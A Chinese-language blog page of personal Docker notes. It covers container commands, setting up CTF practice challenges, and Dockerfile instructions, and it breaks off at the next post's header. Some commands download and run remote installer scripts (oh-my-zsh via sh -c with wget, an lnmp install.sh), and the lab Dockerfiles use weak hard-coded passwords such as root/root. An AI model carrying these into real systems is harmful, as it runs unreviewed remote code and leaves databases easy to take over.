<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <link rel="alternate" href="/atom.xml" title="zhiliya" type="application/atom+xml">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '7.5.0',
    exturl: false,
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: '',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: '复制',
      copy_success: '复制成功',
      copy_failure: '复制失败'
    },
    sidebarPadding: 40
  };
</script>

  <meta name="description" content="emmmm 感觉没啥好说的">
<meta property="og:type" content="website">
<meta property="og:title" content="zhiliya">
<meta property="og:url" content="http://yoursite.com/page/3/index.html">
<meta property="og:site_name" content="zhiliya">
<meta property="og:description" content="emmmm 感觉没啥好说的">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="zhiliya">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://yoursite.com/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false,
    isPage: false,
    isArchive: false
  };
</script>

  <title>zhiliya</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">zhiliya</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
        <p class="site-subtitle">欢迎访问我的博客</p>
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/07/docker/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhiliya">
      <meta itemprop="description" content="emmmm 感觉没啥好说的">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="zhiliya">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/12/07/docker/" class="post-title-link" itemprop="url">docker</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-12-07 16:32:21" itemprop="dateCreated datePublished" datetime="2019-12-07T16:32:21+08:00">2019-12-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-07-31 16:34:30" itemprop="dateModified" datetime="2020-07-31T16:34:30+08:00">2020-07-31</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>netstat  -anp  |grep   端<br>netstat   -nultp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd centos &#x2F;bin&#x2F;bash</span><br><span class="line">docker exec  -it centos env LANG&#x3D;C.UTF-8   bash</span><br><span class="line">安装net-tools</span><br><span class="line">netstat -nr</span><br><span class="line">iptables -t nat –vnL  没用</span><br><span class="line">yum update &amp;&amp; yum install wget -y</span><br><span class="line">wget http:&#x2F;&#x2F;soft.vpser.net&#x2F;lnmp&#x2F;lnmp1.6.tar.gz -cO lnmp1.6.tar.gz &amp;&amp; tar zxf lnmp1.6.tar.gz &amp;&amp; cd lnmp1.6 &amp;&amp; .&#x2F;install.sh lnmp</span><br><span class="line">docker commit -m &quot;centos_lnmp&quot; -a &quot;zhiliya&quot;   xxx lnmp:1.0</span><br><span class="line">docker tag 6ce4aedd12cd wangshibo&#x2F;myubuntu:v1</span><br><span class="line">docker push wangshibo&#x2F;myubuntu:v1</span><br><span class="line">docker load --input k.tar</span><br><span class="line">docker save -o bachang.tar bachang:1.0 </span><br><span class="line"></span><br><span class="line"># 设置lnmp:1.0镜像创建的容器</span><br><span class="line"># 容器80端口映射到宿主7777端口</span><br><span class="line"># 宿主的目录&#x2F;Users&#x2F;sunsheng&#x2F;www&#x2F;wwwroot映射到容器目录&#x2F;home&#x2F;www&#x2F;wwwroot </span><br><span class="line">docker run -dit -p 80:7777 -v &#x2F;root&#x2F;Desktop&#x2F;www:&#x2F;root&#x2F;Desktop&#x2F;www lnmp:1.0 &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<h4 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.6.tar.gz</span><br><span class="line">tar -zxvf redis-4.0.6.tar.gz</span><br><span class="line"> cd redis-4.0.6</span><br><span class="line">make MALLOC&#x3D;libc　　</span><br><span class="line">cd src &amp;&amp; make install</span><br></pre></td></tr></table></figure>





<p>$ sudo pip install gunicorn<br>$ sudo gunicorn –bind 0.0.0.0:8000 -w 1 “CTFd:create_app()”</p>
<p>这里我复现的题目是SUSCTF 2018的题目，下面是github地址<br><a href="https://github.com/susers/Writeups/" target="_blank" rel="noopener">https://github.com/susers/Writeups/</a><br>docker build -t=镜像名字 .<br>docker run –name=容器名字 -p 9999:22  -d 镜像名 </p>
<p>docker run -d -p 4003:80  ctftraining/ciscn_2019_northern_china_day1_web1   –name=</p>
<p>docker run -d -p 100:80 -p 3307:3306 tutum/lamp   </p>
<p>docker-compose.yml只要输入以下两条命令即可:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -i -d -P --restart unless-stopped  --name&#x3D;HITCON_CTF_2017-BabyFirst_Revenge  lamp:1.0</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> docker run -dit   -P   --restart unless-stopped  --name&#x3D;minlingzhixing1  lamp:1.0  &#x2F;bin&#x2F;bash </span><br><span class="line">  docker container rename tender_swanson md5</span><br><span class="line"> docker exec -it d9b76bff6551  &#x2F;bin&#x2F;bash </span><br><span class="line">docker cp robots.php   c08682b7bde9:&#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br></pre></td></tr></table></figure>





<p>git clone <a href="https://github.com/CTFTraining/https://github.com/CTFTraining/ciscn_2019_web_northern_china_day1_web1.git" target="_blank" rel="noopener">https://github.com/CTFTraining/https://github.com/CTFTraining/ciscn_2019_web_northern_china_day1_web1.git</a><br>docker-compose up -d<br>open <a href="http://127.0.0.1:8302/" target="_blank" rel="noopener">http://127.0.0.1:8302/</a></p>
<p>docker-compose up<br>CTFd 将在http：//localhost：8000 上运行。</p>
<p>然后使用以下命令启动 Flask 调试服务器：<br>python serve.py<br>CTFd 现在将在http：//localhost：4000 上运行。</p>
<p>容器可以被创建、启动、停止、删除、暂停<br>{<br>  “registry-mirrors”: [“<a href="https://docker.mirrors.ustc.edu.cn/&quot;,&quot;http://4e70ba5d.m.daocloud.io&quot;]" target="_blank" rel="noopener">https://docker.mirrors.ustc.edu.cn/&quot;,&quot;http://4e70ba5d.m.daocloud.io&quot;]</a><br>}</p>
<p>docker images　　　　　　　　　　　　　　#查看本地已有镜像<br>docker run -i -t httpd /bin/bash　　#运行容器并进入<br>docker run -d -p 80:8080 httpd     #后台运行容器，容器8080端口映射到主机80端口<br>docker run -it -p 23946:23946 ubuntu/17.04.amd64 /bin/bash<br>docker exec -it [container-id] /bin/bash   #进入已有容器<br>docker exec -it [container-id] /bin/bash   #进入已有容器<br>docker exec -it 1b1394e77de7  /bin/bash<br>docker ps -a　　　　　　　　　　　　　　　#查看当前正在运行的镜像</p>
<p>docker start运行对应容器<br>docker stop httpd　　　#关闭容器<br>docker rm 05f5afa34243  删除容器<br>docker rmi 67fa590cfc1c  删除镜像</p>
<p>docker container rename nostalgic_raman ubuntu.17.04.amd64  重命名<br>docker container cp linux_server udocker commit buntu.17.04.i386:/root/linux_server<br>docker container cp linux_server ubuntu.17.04.i386:/root/linux_server<br>docker cp sqli1/ 96630df2cbdf:/var/www/html/<br>container ls  显示对应容器 docker container ls -a</p>
<p>docker search  centos:7  搜索镜像<br>docker pull centos:latest</p>
<p>docker commit +容器id +要生成的镜像名字 把容器转换成镜像</p>
<p>docker system df 查看镜像、容器、数据卷所占用的空间。</p>
<h4 id="screen"><a href="#screen" class="headerlink" title="screen"></a>screen</h4><p>screen -ls<br>screen -r 10992　　//重新建立会话<br>screen -S [会话名称]　　指定建立会话的名称<br>screen -r [会话ID|会话名称]　　回到指定会话，可以是会话名称，也可以是会话ID</p>
<h4 id="时差"><a href="#时差" class="headerlink" title="时差"></a>时差</h4><p>docker exec -it f83573b2a54b  env LANG=C.UTF-8 /bin/bash1<br>如果此时想设置成北京的时间的话，有两种解决方案，第一个是修改容器时区</p>
<p><strong>CentOS</strong></p>
<p>RUN echo “Asia/shanghai” &gt; /etc/timezone;</p>
<p><strong>Ubuntu</strong></p>
<p>RUN cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime<br>第二种方案，更简单，直接把宿主机的时间设置挂载到容器里面，通过docker run -v的方式直接挂载<br>-v /etc/localtime:/etc/localtime:ro 1<br>这种方案需要注意/etc/timezone内容，因为代码中会用到这个设置，也要改成上海时区。最后测试一下，两种方案都是可行的。</p>
<h4 id="docker-for-windows"><a href="#docker-for-windows" class="headerlink" title="docker for windows"></a>docker for windows</h4><p>另外，如果想要关闭Hyper-v来使用vmware之类的虚拟机的话，需要在之前勾选Hyper-v处取消勾选，并以管理员方式打开powershell输入<br>bcdedit /set hypervisorlaunchtype off<br>之后重启即可正常使用其他虚拟软件。<br>重新开启hyper-v需要重新勾选之前取消的Hyper-v选项，然后以管理员方式打开powershell输入<br>bcdedit /set hypervisorlaunchtype auto</p>
<p>（System has not been booted with systemd as init system (PID 1). Can’t operat）</p>
<p>解决方案：/sbin/init</p>
<p>例如：Ubuntu 18.04 ，</p>
<p>docker run -tid –name test –privileged=true ubuntu:18.04 /sbin/init<br>docker exec -it lnmp env LANG=C.UTF-8   /bin/bash</p>
<p>docker run –rm -v <code>pwd</code>/fonts:/usr/share/fonts \</p>
<p>​        -v <code>pwd</code>/output:/app/output \</p>
<p>​        gitbook   “<a href="http://self-publishing.ebookchain.org&quot;" target="_blank" rel="noopener">http://self-publishing.ebookchain.org&quot;</a></p>
<p>如果你觉得上面这条命令太过复杂，更喜欢使用 <code>docker-compose</code> 来简化操作，可以使用下面的配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">version: &#39;2&#39;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line"></span><br><span class="line">  pdf-generator:</span><br><span class="line">    image: soulteary&#x2F;docker-gitbook-pdf-generator</span><br><span class="line">    volumes:</span><br><span class="line">      - .&#x2F;output:&#x2F;root&#x2F;Desktop&#x2F;output:rw</span><br><span class="line">      - .&#x2F;fonts&#x2F;:&#x2F;root&#x2F;Desktop&#x2F;fonts:ro</span><br><span class="line">    # 下面的URL替换为你想生成电子书的地址即可</span><br><span class="line">    command: &quot;http:&#x2F;&#x2F;www.0-sec.org&#x2F;&quot;</span><br></pre></td></tr></table></figure>

<p>将上面的内容保存为 <code>docker-compose.yml</code>，然后执行 <code>docker-compose up</code> 等待电子书生成完毕即可。</p>
<h1 id="0x02-基本指令"><a href="#0x02-基本指令" class="headerlink" title="0x02 基本指令"></a>0x02 基本指令</h1><p>参数：<br> –name  指定容器的名字<br> –rm      容器运行完毕会自动删除<br> -i -t       创建一个提供交互式shell的容器。<br> -d         在后台运行容器，并且打印出容器的ID。<br> -v        目录挂载 前面的是主机后面的是容器<br> –privileged 拥有真正的root权限<br> 后面加的是容器刚生成是运行的程序默认是/bin/bash</p>
<h2 id="0x1-容器生成"><a href="#0x1-容器生成" class="headerlink" title="0x1 容器生成"></a>0x1 容器生成</h2><p><code>docker run --name  weblogic -i -t centos</code><br> 上述命令会生成一个名字为weblogic 的交互式容器，默认执行的是/bin/bash，所以会进入交互界面。如果本地没有centos的镜像会从远程下载到本地。</p>
<h2 id="0x2-生成容器时的其他属性"><a href="#0x2-生成容器时的其他属性" class="headerlink" title="0x2 生成容器时的其他属性"></a>0x2 生成容器时的其他属性</h2><p>docker run 命令用于生成容器 ，生成容器的属性之后不能再改变</p>
<h3 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h3><p>一般拥有web服务的容器都进行端口映射，将docker的80端口映射到主机的8000端口<br> <code>docker run -d -p 8000:80  foo/live /bin/bash</code></p>
<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>在配置mysql  docker的时候使用-e参数设置环境变量<br> <code>docker run --name first-mysql -p 3306:3306 -e MYSQL\_ROOT\_PASSWORD=123456 -d mysql</code></p>
<h2 id="0x3-打开-关闭-附加-删除"><a href="#0x3-打开-关闭-附加-删除" class="headerlink" title="0x3 打开/关闭/附加/删除"></a>0x3 打开/关闭/附加/删除</h2><p><code>docker  start  id  使上述生成的容器启动</code><br> <code>docker  stop id  使上述生成的容器关闭</code><br> <code>docker exec -it id  /bin/bash  附加正在运行的容器</code><br> <code>docker attach continer id/name</code><br> 当重新启动容器时，会沿用创建容器（docker run）命令时指定的参数来运行，可能需要按回车才进入。<br> 这时就已经相当于在容器内部了的shell操作了。如果操作过程中，退出了shell。容器也会随之停止。</p>
<p>exec与attach的区别是当exit容器的时候exec不停止容器，而attach会将容器停止</p>
<hr>
<p>删除时必须保证容器时关闭的<br> <code>docker  rm name/id 删除指定容器</code><br> 删除所有镜像<br> <code>docker rmi $(docker images -q)1</code><br> 根据格式删除所有镜像<br> <code>docker rm $(docker ps -qf status=exited)</code></p>
<h2 id="0x4-压缩-导出-上传"><a href="#0x4-压缩-导出-上传" class="headerlink" title="0x4 压缩/导出/上传"></a>0x4 压缩/导出/上传</h2><p>我们用镜像生成了容器，然后我们可以将容器生成镜像，然后将镜像打成压缩包方便导入导出，同时也可以把镜像上传至dockerhub，供别人下载使用</p>
<h3 id="压缩-容器"><a href="#压缩-容器" class="headerlink" title="压缩(容器)"></a>压缩(容器)</h3><p>我们使用容器 furious_bell，现在要将这个容器保存为一个文件 myunbuntu-export-1204.tar<br> <code>docker export furious_bell &gt; /home/myubuntu-export-1204.tar</code></p>
<h3 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker import  &#x2F;home&#x2F;myubuntu-export-1204.tar  alias</span><br></pre></td></tr></table></figure>

<h3 id="压缩（镜像）"><a href="#压缩（镜像）" class="headerlink" title="压缩（镜像）"></a>压缩（镜像）</h3><p>这里有个基础镜像：ubuntu:12.04，现在要将这个镜像保存为一个文件myubuntu-save-1204.tar<br> <code>docker save 9610cfc68e8d &gt; /home/myubuntu-save-1204.tar</code><br> 有点慢，稍微等待一下，没有任何warn信息就表示保存OK。9610cfc68e8d 是镜像ID</p>
<h3 id="导入-1"><a href="#导入-1" class="headerlink" title="导入"></a>导入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker load &#x2F;home&#x2F;myubuntu-export-1204.tar  alias</span><br></pre></td></tr></table></figure>

<h3 id="上传至远程仓库"><a href="#上传至远程仓库" class="headerlink" title="上传至远程仓库"></a>上传至远程仓库</h3><p>首先拥有一个dockerhub账号<br> 上传之前要登录<br> <code>docker login</code><br> 然后输入用户名密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker login&#96; </span><br><span class="line"> &#96;docker tag id username&#x2F;repositoryname:tag&#96; </span><br><span class="line"> &#96;docker push username&#x2F;repositoryname:tag</span><br></pre></td></tr></table></figure>

<p>关于docker file的编写，有时间再补上</p>
<h1 id="0x3-Dockerfile-编写"><a href="#0x3-Dockerfile-编写" class="headerlink" title="0x3 Dockerfile 编写"></a>0x3 Dockerfile 编写</h1><blockquote>
<p>Dockfile是一种被Docker程序解释的脚本，Dockerfile由一条一条的指令组成，每条指令对应Linux下面的一条命令。Docker程序将这些Dockerfile指令翻译真正的Linux命令。Dockerfile有自己书写格式和支持的命令，Docker程序解决这些命令间的依赖关系，类似于Makefile。</p>
</blockquote>
<p>首先给个实例<br> 运行指令<code>docker build -t name .</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:16.04 </span><br><span class="line"></span><br><span class="line">MAINTAINER 4t10n &lt;act01n@163.com&gt;</span><br><span class="line">ENV DEBIAN_FRONTEND noninteractive </span><br><span class="line">#这里添加更新源 </span><br><span class="line">RUN sed -i &#39;s&#x2F;archive.ubuntu.com&#x2F;mirrors.ustc.edu.cn&#x2F;g&#39; &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br><span class="line"></span><br><span class="line">RUN apt-get update -y &amp;&amp; \ </span><br><span class="line">    apt-get install -y apache2 \</span><br><span class="line">    vim \</span><br><span class="line">    tar \</span><br><span class="line">    php7.0-fpm \</span><br><span class="line">    php7.0-mcrypt \ </span><br><span class="line">    php7.0-mysql  \ </span><br><span class="line">    mysql-client \</span><br><span class="line">    mysql-server   \</span><br><span class="line">    &amp;&amp; &#x2F;etc&#x2F;init.d&#x2F;mysql start \</span><br><span class="line">    &amp;&amp; mysqladmin -uroot password root  \</span><br><span class="line">    &amp;&amp; rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;* </span><br><span class="line"></span><br><span class="line">WORKDIR &#x2F;tmp  </span><br><span class="line">#COPY  .&#x2F;start.sh  &#x2F;tmp&#x2F;</span><br><span class="line">#COPY  .&#x2F;init.sql  &#x2F;tmp&#x2F; </span><br><span class="line">#RUN  chmod a+x start.sh </span><br><span class="line"></span><br><span class="line">#设置数据库 </span><br><span class="line">RUN set -x \</span><br><span class="line">    &amp;&amp; service mysql start \ </span><br><span class="line">    &amp;&amp; mysql  -e &quot;CREATE DATABASE  blog  DEFAULT CHARACTER SET utf8;&quot;  -uroot  -proot \ </span><br><span class="line">    &amp;&amp;  mysql -e &quot;grant select,insert on blog.* to &#39;admin&#39;@&#39;localhost&#39; identified by &#39;password&#39; &quot;  -uroot -proot  </span><br><span class="line"></span><br><span class="line"># copy 源码</span><br><span class="line">#COPY  .&#x2F;default &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;default</span><br><span class="line">#COPY .&#x2F;src &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;</span><br><span class="line">COPY .&#x2F;1.php &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line"></span><br><span class="line"># 设置可写权限 </span><br><span class="line">RUN chown -R  www-data:www-data &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">EXPOSE 80 3306 </span><br><span class="line"></span><br><span class="line">CMD [&quot;&#x2F;tmp&#x2F;start.sh&quot;]1234567891011121314151617181920212223242526272829303132333435363738394041</span><br></pre></td></tr></table></figure>

<p>贴上一个环境较为完整的docker镜像的dockerfile</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:16.04 </span><br><span class="line"></span><br><span class="line">MAINTAINER 4t10n &lt;act01n@163.com&gt;</span><br><span class="line">ENV DEBIAN_FRONTEND noninteractive </span><br><span class="line"></span><br><span class="line">RUN sed -i &#39;s&#x2F;archive.ubuntu.com&#x2F;mirrors.ustc.edu.cn&#x2F;g&#39; &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br><span class="line"></span><br><span class="line">RUN apt-get update -y &amp;&amp; \ </span><br><span class="line">    apt-get install -y software-properties-common  &amp;&amp; \ </span><br><span class="line">    apt-get install -y python-software-properties  &amp;&amp; \ </span><br><span class="line">    add-apt-repository ppa:ondrej&#x2F;php -y &amp;&amp; \</span><br><span class="line">    apt-get update -y &amp;&amp; \ </span><br><span class="line">    apt-get install -y apache2 \</span><br><span class="line">    vim \</span><br><span class="line">    tar \</span><br><span class="line">    php7.0-fpm \</span><br><span class="line">    php7.0-mcrypt \ </span><br><span class="line">    php7.0-mysql  \ </span><br><span class="line">    mysql-client \</span><br><span class="line">    mysql-server   \</span><br><span class="line">    php5.6 \</span><br><span class="line">    php5.6-fpm \</span><br><span class="line">    php5.6-mysql \</span><br><span class="line">    php5.6-mcrypt &amp;&amp; \</span><br><span class="line">    apt-get install -y zsh &amp;&amp; \ </span><br><span class="line">    apt-get install -y git  \</span><br><span class="line">    &amp;&amp; &#x2F;etc&#x2F;init.d&#x2F;mysql start \</span><br><span class="line">    &amp;&amp; sh -c &quot;$(wget https:&#x2F;&#x2F;raw.github.com&#x2F;robbyrussell&#x2F;oh-my-zsh&#x2F;master&#x2F;tools&#x2F;install.sh -O -)&quot; \</span><br><span class="line">    &amp;&amp; mysqladmin -uroot password root  </span><br><span class="line"></span><br><span class="line">12345678910111213141516171819202122232425262728293031</span><br></pre></td></tr></table></figure>

<h2 id="0x1-FROM"><a href="#0x1-FROM" class="headerlink" title="0x1 FROM"></a>0x1 FROM</h2><p>FROM指定一个基础镜像， 一般情况下一个可用的 Dockerfile一定是 FROM 为第一个指令。</p>
<h2 id="0x2-MAINTAINER"><a href="#0x2-MAINTAINER" class="headerlink" title="0x2 MAINTAINER"></a>0x2 MAINTAINER</h2><p>这里是用于指定镜像制作者的信息</p>
<h2 id="0x3-RUN"><a href="#0x3-RUN" class="headerlink" title="0x3 RUN"></a>0x3 RUN</h2><p>RUN命令将在当前image中执行任意合法命令并提交执行结果。命令执行提交后，就会自动执行Dockerfile中的下一个指令。<br> 层级 RUN 指令和生成提交是符合Docker核心理念的做法。它允许像版本控制那样，在任意一个点，对image 镜像进行定制化构建。</p>
<h2 id="0x4-ENV"><a href="#0x4-ENV" class="headerlink" title="0x4 ENV"></a>0x4 ENV</h2><p>ENV指令可以用于为docker容器设置环境变量<br> ENV设置的环境变量，可以使用 docker inspect命令来查看。同时还可以使用docker run –env =来修改环境变量。</p>
<h2 id="0x5-WORKDIR"><a href="#0x5-WORKDIR" class="headerlink" title="0x5 WORKDIR"></a>0x5 WORKDIR</h2><p>WORKDIR 用来切换工作目录的。Docker 默认的工作目录是/，只有 RUN 能执行 cd 命令切换目录，而且还只作用在当下下的  RUN，也就是说每一个 RUN 都是独立进行的。如果想让其他指令在指定的目录下执行，就得靠 WORKDIR。WORKDIR  动作的目录改变是持久的，不用每个指令前都使用一次 WORKDIR。</p>
<h2 id="0x6-COPY"><a href="#0x6-COPY" class="headerlink" title="0x6 COPY"></a>0x6 COPY</h2><p>COPY 将文件从路径<code>&lt;src&gt;</code>复制添加到容器内部路径 <code>&lt;dest&gt;</code></p>
<p><code>&lt;src&gt;</code>必须是想对于源文件夹的一个文件或目录，也可以是一个远程的url，<code>&lt;dest&gt;</code><br> 是目标容器中的绝对路径。<br> 所有的新文件和文件夹都会创建UID 和 GID 。事实上如果<code>&lt;src&gt;</code> 是一个远程文件URL，那么目标文件的权限将会是600。</p>
<h2 id="0x7-ADD"><a href="#0x7-ADD" class="headerlink" title="0x7 ADD"></a>0x7 ADD</h2><p>ADD 将文件从路径  复制添加到容器内部路径<br> 同COPY</p>
<h2 id="0x8-EXPOSE"><a href="#0x8-EXPOSE" class="headerlink" title="0x8 EXPOSE"></a>0x8 EXPOSE</h2><p>EXPOSE 指令指定在docker允许时指定的端口进行转发。</p>
<h2 id="0x9-CMD"><a href="#0x9-CMD" class="headerlink" title="0x9 CMD"></a>0x9 CMD</h2><p>Dockerfile.中只能有一个CMD指令。 如果你指定了多个，那么最后个CMD指令是生效的。<br> CMD指令的主要作用是提供默认的执行容器。这些默认值可以包括可执行文件，也可以省略可执行文件。<br> 当你使用shell或exec格式时， CMD<br> 会自动执行这个命令。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
